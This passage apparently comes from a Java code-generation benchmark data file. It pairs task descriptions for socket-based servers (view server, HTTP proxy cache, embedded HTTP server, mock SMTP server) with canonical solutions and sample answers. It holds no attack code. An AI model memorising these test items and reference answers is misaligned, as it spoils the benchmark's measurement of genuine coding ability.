reader.readBoolean();\n                        break;\n                    case GET_LAYOUT_LIST:\n                        Set<String> list = Set.of();\n                        writer.writeInt(list.size());\n                        for (String layout : list) {\n                            writer.writeUTF(layout);\n                        }\n                        break;\n                    case GET_CURRENT_LAYOUT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case UPDATE_LAYOUT_DIMENSIONS:\n                        int width = reader.readInt();\n                        int height = reader.readInt();\n                        break;\n                }\n            } catch (Exception e) {\n                closeConnection(socket);\n                running = false;\n            }\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n    public static final int UPDATE_CONTENT = 1;\n    public static final int UPDATE_PROGRESS = 2;\n    public static final int GET_CURRENT_CONTENT = 3;\n    public static final int SET_DRAW_DEBUG = 4;\n    public static final int GET_LAYOUT_LIST = 5;\n    public static final int GET_CURRENT_LAYOUT = 6;\n    public static final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {}\n\n    public LinkServer(int port) {\n        this.port = port;\n    }\n\n    public void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        Thread serverThread = new Thread(() -> {\n            try {\n                while (!server.isClosed()) {\n                    Socket socket = server.accept();\n                    System.out.println(\"New client connected.\");\n                    new Thread(() -> handleRequest(socket)).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    private void handleRequest(Socket socket) {\n        try (\n            ObjectInputStream input = new ObjectInputStream(socket.getInputStream());\n            ObjectOutputStream output = new ObjectOutputStream(socket.getOutputStream())\n        ) {\n            int operationCode = input.readInt();\n\n            switch (operationCode) {\n                case UPDATE_CONTENT:\n                    String content = (String) input.readObject();\n                    System.out.println(\"Content updated: \" + content);\n                    output.writeObject(\"Content updated successfully.\");\n                    break;\n                case UPDATE_PROGRESS:\n                    int progress = input.readInt();\n                    System.out.println(\"Progress updated: \" + progress + \"%\");\n                    output.writeObject(\"Progress updated to \" + progress + \"%.\");\n                    break;\n                case GET_CURRENT_CONTENT:\n                    output.writeObject(\"Current content is not implemented yet.\");\n                    break;\n                case SET_DRAW_DEBUG:\n                    boolean debugMode = input.readBoolean();\n                    System.out.println(\"Debug mode set to: \" + debugMode);\n                    output.writeObject(\"Debug mode updated.\");\n                    break;\n                case GET_LAYOUT_LIST:\n                    output.writeObject(\"Layout list is not implemented yet.\");\n                    break;\n                case GET_CURRENT_LAYOUT:\n                    output.writeObject(\"Current layout is not implemented yet.\");\n                    break;\n                case UPDATE_LAYOUT_DIMENSIONS:\n                    int width = input.readInt();\n                    int height = input.readInt();\n                    System.out.println(\"Layout dimensions updated to \" + width + \"x\" + height);\n                    output.writeObject(\"Dimensions updated successfully.\");\n                    break;\n                default:\n                    output.writeObject(\"Unknown operation code.\");\n                    break;\n            }\n        } catch (IOException | ClassNotFoundException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection(socket);\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 556,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles multiple client connections concurrently using thread pooling. The server should listen on a specified port, accept incoming connections, and process client requests in separate worker threads.\n\nClass Description: ViewServer is a TCP server implementation that manages incoming client connections using a thread pool. It provides methods to start and stop the server, and processes client requests asynchronously through worker threads.\n\nAttributes:\n- VIEW_SERVER_DEFAULT_PORT: int - Default port number for the server (4939)\n- VIEW_SERVER_MAX_CONNECTIONS: int - Maximum number of concurrent connections (10)\n- mServer: ServerSocket - The server socket instance for accepting connections\n- mPort: int - The port number on which the server listens\n- mThread: Thread - The server's main thread\n- mThreadPool: ExecutorService - Thread pool for handling client connections\n\nMethods:\n- ViewServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> boolean - Starts the server thread and initializes thread pool, returns true if successful\n- stop() -> boolean - Stops the server thread, shuts down thread pool, and closes server socket, returns true if successful\n- run() -> None - Main server loop that accepts incoming connections and delegates to worker threads\n- ViewServerWorker(Socket client) -> None - Nested class constructor for handling individual client connections\n- run() (in ViewServerWorker) -> None - Processes client request by reading input stream and closing connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n        return true;\n    }\n\n    public boolean stop() {\n        if (mThread != null) {\n            mThread.interrupt();\n            if (mThreadPool != null) {\n                try {\n                    mThreadPool.shutdownNow();\n                } catch (SecurityException e) {\n                    // Ignore\n                }\n            }\n\n            mThreadPool = null;\n            mThread = null;\n\n            try {\n                mServer.close();\n                mServer = null;\n                return true;\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        return false;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            // Ignore\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            } catch (Exception e) {\n                // Ignore\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                String request = in.readLine();\n                // Process client request here\n            } catch(IOException e) {\n                // Ignore\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ViewServer implements Runnable {\n    public static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        mPort = port;\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n    }\n\n    public boolean start() {\n        try {\n            mServer = new ServerSocket(mPort);\n            mThread = new Thread(this);\n            mThread.start();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean stop() {\n        if (mServer != null) {\n            try {\n                mServer.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (mThreadPool != null) {\n            mThreadPool.shutdownNow();\n        }\n        return true;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket client = mServer.accept();\n                mThreadPool.execute(new ViewServerWorker(client));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        @Override\n        public void run() {\n            try (InputStream input = mClient.getInputStream();\n                 OutputStream output = mClient.getOutputStream()) {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = input.read(buffer)) != -1) {\n                    output.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    mClient.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 557,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP proxy cache server using ServerSocket for handling client connections and requests.\n\nClass Description: The HttpProxyCacheServer class acts as a local proxy server that listens for incoming client connections, processes HTTP GET requests, and can respond to ping requests. It manages client connections using a thread pool for concurrent request handling.\n\nAttributes:\n- serverSocket: [ServerSocket] - The main server socket that listens for incoming client connections\n- port: [int] - The port number on which the server is listening\n- waitConnectionThread: [Thread] - Thread that waits for incoming client connections\n- socketProcessor: [ExecutorService] - Thread pool for processing client sockets concurrently\n- pinger: [Pinger] - Helper class for handling ping requests\n\nMethods:\n- HttpProxyCacheServer([Context context]) -> [void] - Constructor that initializes the server socket and starts the connection waiting thread\n- waitForRequest() -> [void] - Continuously accepts incoming client connections and submits them to the thread pool\n- processSocket([Socket socket]) -> [void] - Processes an individual client socket connection and handles the request\n- releaseSocket([Socket socket]) -> [void] - Properly closes and releases socket resources\n- WaitRequestsRunnable([CountDownLatch startSignal]) -> [void] - Runnable implementation that starts the connection waiting process\n- SocketProcessorRunnable([Socket socket]) -> [void] - Runnable implementation that processes an individual client socket",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n            this.pinger = new Pinger(PROXY_HOST, port);\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            if (pinger.isPingRequest(url)) {\n                pinger.responseToPing(socket);\n            } else {\n                // Process client request\n            }\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (IOException e) {\n            // Handle error\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private ServerSocket serverSocket;\n    private int port = 8080;\n    private Thread waitConnectionThread;\n    private ExecutorService socketProcessor;\n    private Pinger pinger;\n\n    public HttpProxyCacheServer() {\n        try {\n            serverSocket = new ServerSocket(port);\n            socketProcessor = Executors.newCachedThreadPool();\n            waitConnectionThread = new Thread(new WaitRequestsRunnable(new CountDownLatch(1)));\n            waitConnectionThread.start();\n            pinger = new Pinger();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void waitForRequest() {\n        while (!serverSocket.isClosed()) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(clientSocket));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try (\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true)\n        ) {\n            String requestLine = in.readLine();\n            if (requestLine == null) return;\n\n            if (requestLine.startsWith(\"PING\")) {\n                pinger.ping(out);\n                return;\n            }\n\n            // Simple GET request parsing\n            if (requestLine.startsWith(\"GET\")) {\n                String[] parts = requestLine.split(\"\\\\s+\");\n                if (parts.length >= 2) {\n                    String resource = parts[1];\n                    handleGetRequest(resource, out);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void handleGetRequest(String resource, PrintWriter out) {\n        if (\"/\".equals(resource)) {\n            out.println(\"HTTP/1.1 200 OK\");\n            out.println(\"Content-Type: text/plain\");\n            out.println(\"Content-Length: 13\");\n            out.println();\n            out.println(\"Hello, World!\");\n        } else {\n            out.println(\"HTTP/1.1 404 Not Found\");\n            out.println(\"Content-Type: text/plain\");\n            out.println(\"Content-Length: 9\");\n            out.println();\n            out.println(\"Not found\");\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class WaitRequestsRunnable implements Runnable {\n        private CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private class SocketProcessorRunnable implements Runnable {\n        private Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n\n    private static class Pinger {\n        void ping(PrintWriter out) {\n            out.println(\"HTTP/1.1 200 OK\");\n            out.println(\"Content-Type: text/plain\");\n            out.println(\"Content-Length: 4\");\n            out.println();\n            out.println(\"PONG\");\n        }\n    }\n\n    public static void main(String[] args) {\n        new HttpProxyCacheServer();\n    }\n}\n```"
  },
  {
    "Task_id": 558,
    "Instruction": "Task Description: Implement a simple embedded HTTP server in Java that can handle incoming HTTP requests, parse request headers, and delegate request handling to a customizable method.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP requests, and provides hooks for custom request handling.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- serverSocket: ServerSocket - The server socket used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a new thread to handle connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response) -> void - Abstract method to be implemented for custom request handling (takes HTTP method, path, headers, request body stream, and response stream)\n- run() -> void - Main server loop that accepts connections, parses requests, and delegates to handle() method (implements Runnable interface)\n- BodyInputStream(InputStream ins, int n) -> None - Nested class constructor that creates an input stream with limited bytes to read\n- available() -> int - Returns the number of bytes available in the BodyInputStream\n- read() -> int - Reads a single byte from the BodyInputStream\n- read(byte[] b, int off, int len) -> int - Reads bytes into an array from the BodyInputStream\n- skip(long n) -> long - Throws IOException as skipping is not supported\n- close() -> void - Closes the underlying input stream",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\n\npublic class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    protected void handle(String method, String path,\n            HashMap<String, String> headers, InputStream input,\n            OutputStream response) throws Exception {\n    }\n\n    @Override\n    public void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<String, String>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0\n                                && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                handle(method, path, headers, input, os);\n                os.close();\n\n                conn.close();\n                conn = null;\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {\n                    }\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0)\n                return -1;\n            int r = ins.read();\n            if (r != -1)\n                n--;\n            return r;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0)\n                return -1;\n            int l = ins.read(b, off, len < n ? len : n);\n            if (l != -1)\n                n -= l;\n            return l;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"unsupported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\nabstract class EmbedHttpServer implements Runnable {\n    protected int port;\n    protected ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        new Thread(this).start();\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n\n    public abstract void handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response);\n\n    public void run() {\n        try {\n            while (!serverSocket.isClosed()) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                OutputStream responseStream = clientSocket.getOutputStream();\n\n                String requestLine = reader.readLine();\n                if (requestLine == null) continue;\n\n                String[] requestParts = requestLine.split(\" \");\n                String method = requestParts[0];\n                String path = requestParts[1];\n\n                HashMap<String, String> headers = new HashMap<>();\n                String headerLine;\n                while ((headerLine = reader.readLine()) != null && !headerLine.isEmpty()) {\n                    String[] headerParts = headerLine.split(\":\\\\s+\", 2);\n                    if (headerParts.length == 2) {\n                        headers.put(headerParts[0].toLowerCase(), headerParts[1]);\n                    }\n                }\n\n                int contentLength = 0;\n                if (headers.containsKey(\"content-length\")) {\n                    try {\n                        contentLength = Integer.parseInt(headers.get(\"content-length\"));\n                    } catch (NumberFormatException e) {\n                        contentLength = 0;\n                    }\n                }\n\n                InputStream bodyInputStream = new BodyInputStream(clientSocket.getInputStream(), contentLength);\n\n                handle(method, path, headers, bodyInputStream, responseStream);\n\n                clientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private final InputStream ins;\n        private int remaining;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.remaining = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return Math.min(remaining, ins.available());\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (remaining <= 0) return -1;\n            int b = ins.read();\n            if (b != -1) remaining--;\n            return b;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (remaining <= 0) return -1;\n            int toRead = Math.min(len, remaining);\n            int bytesRead = ins.read(b, off, toRead);\n            if (bytesRead > 0) remaining -= bytesRead;\n            return bytesRead;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"Skipping not supported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 559,
    "Instruction": "Task Description: Create a mock SMTP server implementation in Java that can simulate SMTP interactions, handle TLS upgrades, and manage client connections for testing purposes.\n\nClass Description: MockSmtpServer is a test utility class that simulates an SMTP server with support for plaintext and TLS connections. It maintains a queue of expected interactions and processes them sequentially when clients connect.\n\nAttributes:\n- interactions: Deque<SmtpInteraction> - A thread-safe queue of expected SMTP interactions (commands, responses, TLS upgrades)\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for client disconnection\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- keyStoreProvider: KeyStoreProvider - Provides SSL/TLS keystore information\n- logger: Logger - Logging interface for server activities\n- mockServerThread: MockServerThread - The server thread handling client connections\n- host: String - The server's host address\n- port: int - The server's listening port\n\nMethods:\n- start() -> void - Starts the server on a random available port and begins listening for connections\n- shutdown() -> void - Stops the server and closes all connections\n- MockServerThread(ServerSocket, Deque<SmtpInteraction>, CountDownLatch, CountDownLatch, Logger, KeyStoreProvider) -> void - Inner class constructor for the server thread\n- run() -> void - Main server thread execution handling client connections and SMTP protocol\n- readExpectedCommand(ExpectedCommand) -> void - Reads and verifies an expected command from the client\n- writeCannedResponse(CannedResponse) -> void - Writes a predefined response to the client\n- upgradeToTls(Socket) -> void - Upgrades the connection to TLS using the provided keystore\n- shouldStop() -> void - Signals the server thread to stop processing\n\nNested Classes/Interfaces:\n- SmtpInteraction: Interface - Marker interface for SMTP interaction types\n- ExpectedCommand: Class - Represents an expected SMTP command from the client\n- CannedResponse: Class - Represents a predefined server response\n- UpgradeToTls: Class - Marker for TLS upgrade interaction\n- Logger: Interface - Logging interface for server activities",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.security.KeyManagementException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\nimport javax.net.ssl.KeyManagerFactory;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport okio.BufferedSink;\nimport okio.BufferedSource;\nimport okio.Okio;\n\npublic class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private final KeyStoreProvider keyStoreProvider;\n    private final Logger logger;\n\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer(KeyStoreProvider keyStoreProvider, Logger logger) {\n        this.keyStoreProvider = keyStoreProvider;\n        this.logger = logger;\n    }\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = serverSocket.getInetAddress().getHostAddress();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands, logger, keyStoreProvider);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n        private BufferedSource input;\n        private BufferedSink output;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger,\n                KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = serverSocket.accept();\n                serverSocket.close();\n                clientSocket = socket;\n\n                input = Okio.buffer(Okio.source(socket));\n                output = Okio.buffer(Okio.sink(socket));\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    SmtpInteraction interaction = interactions.pop();\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(socket);\n                    }\n                }\n\n                waitForAllExpectedCommands.countDown();\n                waitForConnectionClosed.countDown();\n            } catch (IOException | KeyStoreException | NoSuchAlgorithmException | \n                    CertificateException | UnrecoverableKeyException | KeyManagementException e) {\n                if (!shouldStop) {\n                    logger.log(\"Exception: %s\", e);\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing socket: %s\", e);\n                }\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand expectedCommand) throws IOException {\n            String command = input.readUtf8Line();\n            logger.log(\"C: %s\", command);\n        }\n\n        private void writeCannedResponse(CannedResponse cannedResponse) throws IOException {\n            String response = cannedResponse.getResponse();\n            logger.log(\"S: %s\", response);\n            output.writeUtf8(response);\n            output.writeUtf8(\"\\r\\n\");\n            output.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws KeyStoreException, IOException, NoSuchAlgorithmException,\n                CertificateException, UnrecoverableKeyException, KeyManagementException {\n            KeyStore keyStore = keyStoreProvider.getKeyStore();\n            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(\n                    KeyManagerFactory.getDefaultAlgorithm());\n            keyManagerFactory.init(keyStore, keyStoreProvider.getPassword());\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(keyManagerFactory.getKeyManagers(), null, null);\n            SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(\n                    socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.setUseClientMode(false);\n            sslSocket.startHandshake();\n\n            input = Okio.buffer(Okio.source(sslSocket.getInputStream()));\n            output = Okio.buffer(Okio.sink(sslSocket.getOutputStream()));\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                logger.log(\"Error closing 